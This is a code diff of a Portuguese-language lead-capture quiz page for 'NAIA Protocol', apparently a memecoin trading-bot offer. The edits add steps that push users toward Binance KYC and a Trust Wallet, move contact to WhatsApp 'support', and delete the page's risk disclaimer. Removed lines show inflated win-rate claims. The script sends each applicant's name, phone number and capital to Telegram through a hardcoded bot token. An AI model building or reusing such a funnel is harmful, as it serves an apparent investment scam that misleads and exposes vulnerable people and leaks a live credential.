@@ -289,7 +289,7 @@
     .btn-blue:active { transform: scale(0.97); }
     .btn-blue:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
 
-    .btn-ig {
+    .btn-wa {
       display: flex;
       align-items: center;
       justify-content: center;
@@ -298,7 +298,7 @@
       min-height: 60px;
       border: none;
       border-radius: 13px;
-      background: linear-gradient(135deg, #833AB4, #E1306C, #F77737);
+      background: linear-gradient(135deg, #25D366, #128C7E);
       color: #fff;
       font-family: 'Poppins', sans-serif;
       font-size: 16px;
@@ -306,11 +306,11 @@
       letter-spacing: 0.02em;
       cursor: pointer;
       text-decoration: none;
-      box-shadow: 0 0 28px rgba(225,48,108,0.35);
+      box-shadow: 0 0 28px rgba(37,211,102,0.35);
       transition: transform 0.15s, box-shadow 0.15s;
     }
-    .btn-ig:hover { box-shadow: 0 0 44px rgba(225,48,108,0.55); }
-    .btn-ig:active { transform: scale(0.97); }
+    .btn-wa:hover { box-shadow: 0 0 44px rgba(37,211,102,0.55); }
+    .btn-wa:active { transform: scale(0.97); }
 
     /* ── Summary card ── */
     .summary-row {
@@ -368,7 +368,7 @@
       </svg>
       NAIA Protocol
     </div>
-    <div id="step-lbl">Passo <b id="step-now">1</b> de 5</div>
+    <div id="step-lbl">Passo <b id="step-now">1</b> de 9</div>
   </div>
   <div id="prog-track"><div id="prog-fill"></div></div>
 </div>
@@ -395,7 +395,7 @@
           Descubra se o <span style="color:#00B4FF;text-shadow:0 0 18px rgba(0,180,255,.5);">NAIA</span><br>é pra você
         </h1>
         <p style="font-size:14px;color:var(--muted);line-height:1.65;max-width:320px;margin:0 auto;">
-          Vamos entender o seu perfil em 5 passos rápidos — e te explicar como o sistema funciona no caminho.
+          Vamos entender o seu perfil em passos rápidos — e te explicar como a tecnologia funciona no caminho.
         </p>
       </div>
 
@@ -419,7 +419,7 @@
           COMEÇAR VERIFICAÇÃO
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
         </button>
-        <p style="font-size:11px;color:rgba(255,255,255,.22);text-align:center;margin-top:9px;">Menos de 2 minutos · Sem cadastro</p>
+        <p style="font-size:11px;color:rgba(255,255,255,.22);text-align:center;margin-top:9px;">Menos de 3 minutos · Sem cadastro complexo</p>
       </div>
 
     </div>
@@ -428,175 +428,194 @@
   <!-- ══════════ TELA 1 — NOME ══════════ -->
   <div id="s1" class="scr">
     <div class="inner">
-
       <div class="exp-card stg">
         <div class="exp-tag">O que é o NAIA</div>
         <p>
-          O <strong>NAIA</strong> é um bot de trading com inteligência artificial que opera memecoins automaticamente na Solana.
-          Enquanto você trabalha, dorme ou vive sua vida, ele fica de olho no mercado e executa as operações por você.
-          <strong>Sem precisar de nenhum conhecimento técnico.</strong>
+          O <strong>NAIA</strong> é um bot de trading com inteligência artificial que opera memecoins automaticamente na rede Solana.
+          Enquanto você trabalha ou dorme, ele detecta oportunidades no mercado e executa.
         </p>
       </div>
-
       <div class="stg" style="transition-delay:.08s;">
         <div class="form-label">Qual é o seu nome?</div>
         <div class="form-sub">Pra gente conseguir te atender de forma personalizada.</div>
-        <input
-          id="f-nome"
-          class="txt-input"
-          type="text"
-          placeholder="Seu primeiro nome"
-          autocomplete="given-name"
-          oninput="checkStep1()"
-        />
+        <input id="f-nome" class="txt-input" type="text" placeholder="Seu primeiro nome" autocomplete="given-name" oninput="checkStep1()"/>
       </div>
-
       <div class="stg" style="transition-delay:.14s;">
-        <button id="btn1" class="btn-blue" onclick="goStep(2)" disabled>
-          CONTINUAR
-          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
-        </button>
+        <button id="btn1" class="btn-blue" onclick="goStep(2)" disabled>CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
       </div>
-
     </div>
   </div>
 
   <!-- ══════════ TELA 2 — EXPERIÊNCIA ══════════ -->
   <div id="s2" class="scr">
     <div class="inner">
-
       <div class="exp-card stg">
         <div class="exp-tag">Como o NAIA opera</div>
         <p>
           O sistema tem um <strong>Scanner</strong> que monitora milhares de tokens ao mesmo tempo.
-          Quando detecta uma oportunidade, o <strong>Sniper</strong> entra na operação em menos de 94ms —
-          antes da maioria do mercado perceber o movimento.
+          Quando detecta uma oportunidade, o <strong>Sniper</strong> entra na operação em menos de 94ms.
         </p>
-        <div class="exp-stat">
-          <div class="exp-stat-item"><div class="val" style="color:#00FF94;">97%</div><div class="lbl">Cobertura de pares</div></div>
-          <div class="exp-stat-item"><div class="val" style="color:#00B4FF;">≤94ms</div><div class="lbl">Velocidade de entrada</div></div>
-          <div class="exp-stat-item"><div class="val" style="color:#fff;">12x</div><div class="lbl">Mais rápido que o mercado</div></div>
-        </div>
       </div>
-
       <div class="stg" style="transition-delay:.08s;">
         <div class="form-label">Você já operou cripto antes?</div>
-        <div class="form-sub">Não tem resposta certa — é só pra entendermos seu nível.</div>
+        <div class="form-sub">Só pra entendermos seu nível técnico atual.</div>
         <div class="opts" id="opts2">
           <button class="opt" onclick="pickOpt('opts2',this,'experiencia','Nunca operei cripto')"><span class="opt-dot"></span>Nunca operei cripto</button>
           <button class="opt" onclick="pickOpt('opts2',this,'experiencia','Comprei e vendi algumas vezes')"><span class="opt-dot"></span>Comprei e vendi algumas vezes</button>
           <button class="opt" onclick="pickOpt('opts2',this,'experiencia','Opero regularmente')"><span class="opt-dot"></span>Opero regularmente</button>
-          <button class="opt" onclick="pickOpt('opts2',this,'experiencia','Já uso bots ou automação')"><span class="opt-dot"></span>Já uso bots ou automação</button>
+          <button class="opt" onclick="pickOpt('opts2',this,'experiencia','Já uso bots/automação')"><span class="opt-dot"></span>Já uso bots ou automação</button>
         </div>
       </div>
-
       <div class="stg" style="transition-delay:.14s;">
         <button id="btn2" class="btn-blue" onclick="goStep(3)" disabled>CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
       </div>
-
     </div>
   </div>
 
-  <!-- ══════════ TELA 3 — OBJETIVO ══════════ -->
+  <!-- ══════════ TELA 3 — DISPOSITIVO ══════════ -->
   <div id="s3" class="scr">
     <div class="inner">
-
-      <div class="exp-card stg">
-        <div class="exp-tag">Os resultados</div>
-        <p>
-          O NAIA fecha operações com <strong>91.2% de acerto</strong> e risco/retorno médio de <strong>1:2.8</strong>.
-          Isso significa que, em média, cada R$ 1 de risco pode gerar R$ 2,80 de retorno.
-          Os lucros vão <strong>direto pra sua carteira</strong> — sem nenhum intermediário no meio.
-        </p>
-        <div class="exp-stat">
-          <div class="exp-stat-item"><div class="val" style="color:#00FF94;">91.2%</div><div class="lbl">Taxa de acerto</div></div>
-          <div class="exp-stat-item"><div class="val" style="color:#00B4FF;">1:2.8</div><div class="lbl">Risco / Retorno</div></div>
-          <div class="exp-stat-item"><div class="val" style="color:#fff;">≤3%</div><div class="lbl">Drawdown máximo</div></div>
-        </div>
-      </div>
-
       <div class="stg" style="transition-delay:.08s;">
-        <div class="form-label">Qual é o seu principal objetivo?</div>
-        <div class="form-sub">O que te trouxe até aqui?</div>
+        <div class="form-label">Qual dispositivo você usa no dia a dia?</div>
+        <div class="form-sub">O robô roda na nuvem 24/7, mas você precisará acompanhá-lo pelo seu celular.</div>
         <div class="opts" id="opts3">
-          <button class="opt" onclick="pickOpt('opts3',this,'objetivo','Renda passiva sem precisar operar')"><span class="opt-dot"></span>Renda passiva sem precisar operar</button>
-          <button class="opt" onclick="pickOpt('opts3',this,'objetivo','Maximizar o retorno do meu capital')"><span class="opt-dot"></span>Maximizar o retorno do meu capital</button>
-          <button class="opt" onclick="pickOpt('opts3',this,'objetivo','Aprender sobre cripto e automação')"><span class="opt-dot"></span>Aprender sobre cripto e automação</button>
-          <button class="opt" onclick="pickOpt('opts3',this,'objetivo','Escalar capital de forma consistente')"><span class="opt-dot"></span>Escalar capital de forma consistente</button>
+          <button class="opt" onclick="pickOpt('opts3',this,'dispositivo','iPhone (iOS)')"><span class="opt-dot"></span>iPhone (iOS)</button>
+          <button class="opt" onclick="pickOpt('opts3',this,'dispositivo','Android')"><span class="opt-dot"></span>Android</button>
         </div>
       </div>
-
       <div class="stg" style="transition-delay:.14s;">
         <button id="btn3" class="btn-blue" onclick="goStep(4)" disabled>CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
       </div>
-
     </div>
   </div>
 
-  <!-- ══════════ TELA 4 — CAPITAL ══════════ -->
+  <!-- ══════════ TELA 4 — BINANCE ══════════ -->
   <div id="s4" class="scr">
     <div class="inner">
-
       <div class="exp-card stg">
-        <div class="exp-tag">Segurança e controle</div>
+        <div class="exp-tag">A porta de entrada</div>
         <p>
-          O NAIA é <strong>100% não-custodial</strong>: você mantém o controle total da sua carteira e das suas chaves.
-          O bot só opera com a sua autorização — e você acompanha cada trade em tempo real pelo painel.
-          <strong>Ninguém tem acesso ao seu dinheiro além de você.</strong>
+          O sistema precisa de capital. Nós usamos corretoras centralizadas, como a <strong>Binance</strong>, apenas como "ponte" (fazer um PIX em reais e converter para a moeda SOL).
+          <br><br>O bot <strong>não</strong> opera dentro da Binance.
         </p>
       </div>
-
       <div class="stg" style="transition-delay:.08s;">
-        <div class="form-label">Quanto você tem disponível pra começar?</div>
-        <div class="form-sub">Ajuda a entender o melhor setup pra você.</div>
+        <div class="form-label">Você já tem conta verificada na Binance?</div>
+        <div class="form-sub">Isso é necessário para podermos enviar os fundos para a operação.</div>
         <div class="opts" id="opts4">
-          <button class="opt" onclick="pickOpt('opts4',this,'capital','Ainda não tenho capital separado')"><span class="opt-dot"></span>Ainda não tenho capital separado</button>
-          <button class="opt" onclick="pickOpt('opts4',this,'capital','Menos de 1 SOL')"><span class="opt-dot"></span>Menos de 1 SOL</button>
-          <button class="opt" onclick="pickOpt('opts4',this,'capital','Entre 1 e 5 SOL')"><span class="opt-dot"></span>Entre 1 e 5 SOL</button>
-          <button class="opt" onclick="pickOpt('opts4',this,'capital','Mais de 5 SOL')"><span class="opt-dot"></span>Mais de 5 SOL</button>
+          <button class="opt" onclick="pickBinance(this, 'Sim, já tenho')"><span class="opt-dot"></span>Sim, já tenho</button>
+          <button class="opt" onclick="pickBinance(this, 'Não tenho')"><span class="opt-dot"></span>Não tenho (vou precisar criar)</button>
+        </div>
+        <div id="binance-warn" style="display:none; margin-top: 15px; font-size:12px; color:var(--accent); line-height:1.5;">
+          ⚠️ <strong>Atenção:</strong> Como você ainda não tem, será necessário baixar o app da Binance e enviar sua documentação (processo rápido KYC) antes de iniciar.
         </div>
       </div>
-
       <div class="stg" style="transition-delay:.14s;">
         <button id="btn4" class="btn-blue" onclick="goStep(5)" disabled>CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
       </div>
-
     </div>
   </div>
 
-  <!-- ══════════ TELA 5 — CONTATO ══════════ -->
+  <!-- ══════════ TELA 5 — SOLANA & PUMPFUN ══════════ -->
   <div id="s5" class="scr">
     <div class="inner">
+      <div class="stg">
+        <div class="form-label" style="font-size:24px; margin-bottom: 20px;">O Terreno: Solana e Memecoins</div>
+        <div class="exp-card">
+          <div class="exp-tag">Velocidade e Taxas</div>
+          <p>
+            Por que o NAIA não opera Bitcoin ou Ethereum? Porque o nosso foco são as <strong>Memecoins</strong> recém-lançadas na plataforma <strong>Pump.fun</strong>.
+            <br><br>
+            Isso só é lucrativo porque usamos a rede <strong>Solana</strong>. 
+            Cada operação na Solana custa frações de centavos e ocorre em milissegundos. Isso permite que o bot entre e saia de dezenas de moedas na "velocidade da luz", extraindo lucro rápido (scalping).
+          </p>
+        </div>
+      </div>
+      <div class="stg" style="transition-delay:.14s;">
+        <button id="btn5" class="btn-blue" onclick="goStep(6)">ENTENDI, CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
+      </div>
+    </div>
+  </div>
 
+  <!-- ══════════ TELA 6 — TRUST WALLET ══════════ -->
+  <div id="s6" class="scr">
+    <div class="inner">
+      <div class="stg">
+        <div class="form-label" style="font-size:24px; margin-bottom: 20px;">Sua Carteira de Autocustódia</div>
+        <div class="exp-card">
+          <div class="exp-tag">Segurança Máxima</div>
+          <p>
+            Lembra que dissemos que o bot não opera na Binance? O seu capital sai da Binance e vai para a sua <strong>Trust Wallet</strong>.
+            <br><br>
+            "Quem tem as chaves, tem o dinheiro". O NAIA se conecta à sua carteira através de contratos inteligentes (Web3) de forma 100% não-custodial. 
+            <strong>Os lucros caem direto nela e nós não temos acesso ao seu saldo.</strong>
+          </p>
+        </div>
+      </div>
+      <div class="stg" style="transition-delay:.14s;">
+        <button id="btn6" class="btn-blue" onclick="goStep(7)">ENTENDI, CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ TELA 7 — OBJETIVO ══════════ -->
+  <div id="s7" class="scr">
+    <div class="inner">
+      <div class="stg">
+        <div class="form-label">Qual é o seu principal objetivo?</div>
+        <div class="form-sub">O que te trouxe até aqui hoje?</div>
+        <div class="opts" id="opts7">
+          <button class="opt" onclick="pickOpt('opts7',this,'objetivo','Renda passiva sem precisar operar')"><span class="opt-dot"></span>Renda passiva sem precisar operar</button>
+          <button class="opt" onclick="pickOpt('opts7',this,'objetivo','Maximizar o retorno do meu capital')"><span class="opt-dot"></span>Maximizar o retorno do meu capital</button>
+          <button class="opt" onclick="pickOpt('opts7',this,'objetivo','Aprender sobre Web3 e automação')"><span class="opt-dot"></span>Aprender sobre Web3 e automação</button>
+        </div>
+      </div>
+      <div class="stg" style="transition-delay:.14s;">
+        <button id="btn7" class="btn-blue" onclick="goStep(8)" disabled>CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ TELA 8 — CAPITAL ══════════ -->
+  <div id="s8" class="scr">
+    <div class="inner">
+      <div class="stg">
+        <div class="form-label">Quanto você tem disponível pra começar na operação?</div>
+        <div class="form-sub">Ajuda a nossa equipe a te alocar no melhor servidor.</div>
+        <div class="opts" id="opts8">
+          <button class="opt" onclick="pickOpt('opts8',this,'capital','Ainda não tenho capital separado')"><span class="opt-dot"></span>Ainda não tenho capital separado</button>
+          <button class="opt" onclick="pickOpt('opts8',this,'capital','Menos de 1 SOL')"><span class="opt-dot"></span>Menos de 1 SOL</button>
+          <button class="opt" onclick="pickOpt('opts8',this,'capital','Entre 1 e 5 SOL')"><span class="opt-dot"></span>Entre 1 e 5 SOL</button>
+          <button class="opt" onclick="pickOpt('opts8',this,'capital','Mais de 5 SOL')"><span class="opt-dot"></span>Mais de 5 SOL</button>
+        </div>
+      </div>
+      <div class="stg" style="transition-delay:.14s;">
+        <button id="btn8" class="btn-blue" onclick="goStep(9)" disabled>CONTINUAR <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg></button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ TELA 9 — WHATSAPP ══════════ -->
+  <div id="s9" class="scr">
+    <div class="inner">
       <div class="exp-card stg">
-        <div class="exp-tag">Próximo passo</div>
+        <div class="exp-tag">Última etapa</div>
         <p>
-          Com base no que você respondeu, um especialista vai te atender <strong>pessoalmente</strong>
-          para tirar todas as dúvidas, mostrar o sistema funcionando ao vivo e te ajudar a dar o primeiro passo.
-          <strong>Sem pressão, sem enrolação.</strong>
+          O seu perfil foi mapeado. O nosso suporte (Professor Rafael ou Amanda) vai entrar em contato com você <strong>pessoalmente no WhatsApp</strong>
+          para validar seus dados, mostrar a máquina ao vivo e fazer a conexão caso aprovado.
         </p>
       </div>
-
       <div class="stg" style="transition-delay:.08s;">
-        <div class="form-label">Qual é o seu Instagram?</div>
-        <div class="form-sub">Pra gente te mandar uma DM e marcar o melhor horário.</div>
-        <input
-          id="f-ig"
-          class="txt-input"
-          type="text"
-          placeholder="@seuinstagram"
-          autocomplete="off"
-          oninput="checkStep5()"
-        />
+        <div class="form-label">Qual é o seu WhatsApp?</div>
+        <div class="form-sub">Informe com DDD. Ex: 11999999999</div>
+        <input id="f-wa" class="txt-input" type="tel" placeholder="Seu WhatsApp" autocomplete="off" oninput="checkStep9()"/>
       </div>
-
       <div class="stg" style="transition-delay:.14s;">
-        <button id="btn5" class="btn-blue" onclick="goFinal()" disabled>
-          VER MEU PERFIL
+        <button id="btn9" class="btn-blue" onclick="goFinal()" disabled>
+          FINALIZAR E ENVIAR DADOS
           <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
         </button>
       </div>
-
     </div>
   </div>
 
@@ -604,7 +623,6 @@
   <div id="sf" class="scr">
     <div class="inner" style="align-items:center;">
 
-      <!-- Checkmark -->
       <div class="stg" style="text-align:center;">
         <div style="width:68px;height:68px;border-radius:50%;background:rgba(0,255,148,.1);border:1.5px solid rgba(0,255,148,.3);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;">
           <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00FF94" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg>
@@ -613,10 +631,9 @@
         <h2 style="font-size:clamp(22px,6.5vw,30px);font-weight:900;line-height:1.25;">
           Tudo certo, <span id="final-nome" style="color:#00B4FF;text-shadow:0 0 16px rgba(0,180,255,.4);">...</span>!
         </h2>
-        <p style="font-size:13px;color:var(--muted);margin-top:8px;line-height:1.6;">Seu perfil está pronto. Um especialista vai te chamar no Instagram.</p>
+        <p style="font-size:13px;color:var(--muted);margin-top:8px;line-height:1.6;">Os seus dados foram enviados para o nosso sistema.</p>
       </div>
 
-      <!-- Resumo -->
       <div class="stg" style="width:100%;transition-delay:.1s;">
         <div style="background:var(--glass);border:1px solid var(--gb);border-radius:16px;padding:18px 20px;">
           <div style="font-size:10px;font-weight:700;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:12px;">Resumo do perfil</div>
@@ -624,22 +641,15 @@
         </div>
       </div>
 
-      <!-- Instagram CTA -->
       <div class="stg" style="width:100%;transition-delay:.18s;">
-        <a id="ig-btn" href="#" target="_blank" rel="noopener" class="btn-ig">
-          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="2" y="2" width="20" height="20" rx="5" ry="5"/>
-            <circle cx="12" cy="12" r="4"/>
-            <path d="M17.5 6.5h.01" stroke-width="2.5"/>
+        <a href="https://wa.me/554192294366" target="_blank" rel="noopener" class="btn-wa">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="white" stroke="none">
+             <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.888-.788-1.487-1.761-1.66-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.086 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/>
           </svg>
-          FALAR COM ESPECIALISTA
+          FALAR COM ATENDENTE
         </a>
-        <p style="text-align:center;margin-top:9px;font-size:11px;color:rgba(255,255,255,.22);">Abre o Instagram direto na conversa</p>
+        <p style="text-align:center;margin-top:9px;font-size:11px;color:rgba(255,255,255,.22);">Abre o WhatsApp oficial do suporte</p>
       </div>
-
-      <p class="stg" style="font-size:10px;color:rgba(255,255,255,.18);text-align:center;line-height:1.65;padding:0 8px;transition-delay:.24s;">
-        Aviso de risco: Trading de criptomoedas envolve alto risco. Resultados passados não garantem resultados futuros. Este produto não constitui aconselhamento financeiro.
-      </p>
 
     </div>
   </div>
@@ -647,13 +657,18 @@
 </div>
 
 <script>
-const IG_HANDLE = 'naiaprotocol'; // ← ALTERE PARA O SEU @
-
-const form = { nome:'', experiencia:'', objetivo:'', capital:'', contato:'' };
+const form = { nome:'', experiencia:'', dispositivo:'', binance:'', objetivo:'', capital:'', contato:'' };
 let cur = 0;
 
-const STEPS = [null,'s1','s2','s3','s4','s5'];
-const PROG  = [0, 20, 40, 60, 80, 100];
+// Agora são 9 passos antes do final
+const STEPS = [null,'s1','s2','s3','s4','s5','s6','s7','s8','s9'];
+const TOTAL_STEPS = 9;
+
+function updateProg(n) {
+  const pct = (n / TOTAL_STEPS) * 100;
+  document.getElementById('step-now').textContent = n;
+  document.getElementById('prog-fill').style.width = pct + '%';
+}
 
 function goStep(n) {
   const from = n === 1 ? 's0' : STEPS[n-1];
@@ -671,8 +686,7 @@ function goStep(n) {
     tEl.scrollTop = 0;
 
     cur = n;
-    document.getElementById('step-now').textContent = n;
-    document.getElementById('prog-fill').style.width = PROG[n] + '%';
+    updateProg(n);
 
     setTimeout(() => {
       tEl.querySelectorAll('.stg').forEach((el,i) =>
@@ -680,9 +694,8 @@ function goStep(n) {
       );
     }, 60);
 
-    if (n === 1) {
-      setTimeout(() => document.getElementById('f-nome')?.focus(), 400);
-    }
+    if (n === 1) setTimeout(() => document.getElementById('f-nome')?.focus(), 400);
+    if (n === 9) setTimeout(() => document.getElementById('f-wa')?.focus(), 400);
   }, 280);
 }
 
@@ -695,32 +708,44 @@ function pickOpt(groupId, btn, field, val) {
   if (next) next.disabled = false;
 }
 
+function pickBinance(btn, val) {
+  pickOpt('opts4', btn, 'binance', val);
+  const warn = document.getElementById('binance-warn');
+  if(val === 'Não tenho') {
+    warn.style.display = 'block';
+  } else {
+    warn.style.display = 'none';
+  }
+}
+
 function checkStep1() {
   const v = document.getElementById('f-nome').value.trim();
   form.nome = v;
   document.getElementById('btn1').disabled = v.length < 2;
 }
 
-function checkStep5() {
-  const v = document.getElementById('f-ig').value.trim();
+function checkStep9() {
+  const v = document.getElementById('f-wa').value.trim();
   form.contato = v;
-  document.getElementById('btn5').disabled = v.length < 3;
+  document.getElementById('btn9').disabled = v.length < 8; // Mínimo pra número de telefone com DDD
 }
 
 function goFinal() {
   form.nome    = document.getElementById('f-nome').value.trim();
-  form.contato = document.getElementById('f-ig').value.trim();
+  form.contato = document.getElementById('f-wa').value.trim();
 
-  // Envio para o Telegram
+  // ENVIO PARA O TELEGRAM
   const telegramBotToken = "8607846534:AAHxMCKNINP9xC-2qH34l0uCOrKMYW3oz4k"; 
   const telegramChatId = "8282567726";
   
-  const message = `🚨 *NOVA APLICAÇÃO NAIA (NOVO FUNIL)* 🚨\n\n` +
+  const message = `🚨 *NOVA APLICAÇÃO NAIA (FUNIL EXPANDIDO)* 🚨\n\n` +
                   `👤 *Operador:* ${form.nome}\n` +
+                  `📱 *WhatsApp:* ${form.contato}\n` +
+                  `📱 *Dispositivo:* ${form.dispositivo}\n` +
+                  `🏦 *Binance:* ${form.binance}\n` +
                   `📊 *Experiência:* ${form.experiencia}\n` +
                   `🎯 *Objetivo:* ${form.objetivo}\n` +
-                  `💰 *Capital:* ${form.capital}\n` +
-                  `📱 *Instagram:* ${form.contato}`;
+                  `💰 *Capital:* ${form.capital}`;
 
   fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
@@ -732,7 +757,8 @@ function goFinal() {
       })
   }).catch(e => console.error("Erro no Telegram:", e));
 
-  const fEl = document.getElementById('s5');
+  // TRANSIÇÃO DE TELA
+  const fEl = document.getElementById('s9');
   const tEl = document.getElementById('sf');
 
   fEl.classList.add('slide-out');
@@ -742,16 +768,17 @@ function goFinal() {
     setTimeout(() => tEl.classList.remove('slide-in'), 340);
     tEl.scrollTop = 0;
 
-    document.getElementById('step-now').textContent = '5';
+    document.getElementById('step-now').textContent = '9';
     document.getElementById('prog-fill').style.width = '100%';
 
     document.getElementById('final-nome').textContent = form.nome;
 
     const rows = [
+      ['Dispositivo', form.dispositivo],
+      ['Binance KYC', form.binance],
       ['Experiência', form.experiencia],
-      ['Objetivo',    form.objetivo],
       ['Capital',     form.capital],
-      ['Instagram',   form.contato],
+      ['WhatsApp',    form.contato],
     ];
     document.getElementById('summary').innerHTML = rows.map(([k,v]) => `
       <div class="summary-row">
@@ -759,9 +786,6 @@ function goFinal() {
         <span class="val">${v || '—'}</span>
       </div>
     `).join('');
-
-    const igHandle = form.contato.replace(/^@/,'') || IG_HANDLE;
-    document.getElementById('ig-btn').href = `https://ig.me/m/${IG_HANDLE}`;
 
     setTimeout(() => {
       tEl.querySelectorAll('.stg').forEach((el,i) =>
@@ -787,7 +811,7 @@ function confetti() {
   }
 }
 
-// Particles
+// Particles (Original background effect)
 (() => {
   const cv = document.getElementById('cv');
   const cx = cv.getContext('2d');
